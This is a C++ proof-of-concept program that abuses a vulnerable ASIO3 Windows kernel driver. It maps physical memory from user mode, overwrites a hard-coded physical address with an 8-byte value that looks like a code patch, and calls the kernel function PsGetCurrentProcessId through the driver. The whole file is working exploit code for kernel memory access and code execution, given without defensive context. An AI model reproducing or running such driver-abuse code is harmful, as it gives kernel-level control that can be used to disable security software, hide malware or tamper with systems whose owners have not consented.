#include <Windows.h>
#include <iostream>

#include "asio3_interface.h"

int test_map_x64()
{
	asio3_interface* vuln_driver = asio3_interface::get_instance();

	asio3_info::structures::_IOCTL_MAP_UNMAP_PHYS_MEMORY_X64 driver_buffer = { 0 };
	if (vuln_driver->map_phys_memory_x64(0x1000, 0x1000, &driver_buffer))
	{
		printf("Mapped physical memory to 0x%llX\n", driver_buffer.out_mapped_address);
	}
	else
	{
		printf("Failed mapping phys memory (0x%lX)\n", GetLastError());
		std::cin.get();
		return 1;
	}

	system("pause");

	if (vuln_driver->unmap_phys_memory_x64(&driver_buffer))
	{
		printf("Unmapped physical memory succefully!\n");
	}
	else
	{
		printf("Failed unmapping phys memory (0x%lX)\n", GetLastError());
		std::cin.get();
		return 1;
	}
}

int test_map_x32()
{
	asio3_interface* vuln_driver = asio3_interface::get_instance();
	ULONG64 mapped_address = vuln_driver->map_phys_memory_x32(0x15adc0C48, 0x1000);
	if (mapped_address)
	{
		printf("Mapped physical memory to 0x%llX : (0x%llX)\n", mapped_address, *reinterpret_cast<ULONG64*>(mapped_address));

		*reinterpret_cast<ULONG64*>(mapped_address) = 0x7489C300000002B8;

		printf("Changed physical memory to 0x%llX : (0x%llX)\n", mapped_address, *reinterpret_cast<ULONG64*>(mapped_address));
	}
	else
	{
		printf("Failed mapping phys memory (0x%lX)\n", GetLastError());
		std::cin.get();
		return 1;
	}

	system("pause");

	if (vuln_driver->unmap_phys_memory_x32(mapped_address))
	{
		printf("Unmapped physical memory succefully!\n");
	}
	else
	{
		printf("Failed unmapping phys memory (0x%lX)\n", GetLastError());
		std::cin.get();
		return 1;
	}
}

int main()
{
	asio3_interface* vuln_driver = asio3_interface::get_instance();

	//if (!vuln_driver->initialize_interface())
	//{
	//	printf("Failed initialzing ASIO interface (0x%lX)\n", GetLastError());
	//	std::cin.get();
	//	return 1;
	//}


	if (!vuln_driver->initialize_interface())
	{
		printf("Failed initialzing ASIO interface (0x%lX)\n", GetLastError());
		std::cin.get();
		return 1;
	}
	
	PVOID _PsGetCurrentProcessId = vuln_driver->get_kernel_export("ntoskrnl.exe", "PsGetCurrentProcessId");

	HANDLE kernel_pid = NULL;
	vuln_driver->call_function(_PsGetCurrentProcessId, &kernel_pid);//PsGetCurrentProcessId
	printf("PsGetCurrentProcessId : %i\n", kernel_pid);
	printf("GetCurrentProcessId : %i\n", GetCurrentProcessId());
	//test_map_x32();
	//test_map_x64();
	
	printf("Handle opened : 0x%lX\n", vuln_driver->device_handle);

	std::cin.get();

	vuln_driver->on_exit();

	return 1;
}